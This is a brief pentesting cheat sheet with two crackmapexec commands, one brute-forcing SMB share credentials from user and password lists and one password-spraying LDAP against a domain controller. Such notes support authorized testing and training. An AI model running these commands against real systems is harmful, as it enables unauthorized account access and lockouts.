# bruteforce smb shares

```bash
crackmapexec smb $rhost -u pot-user.txt -p pot-passwords.txt
```

# bruteforce ldap

```bash
crackmapexec ldap $rhost -u users.txt --kdcHost $rhost -p 'some.password'
```
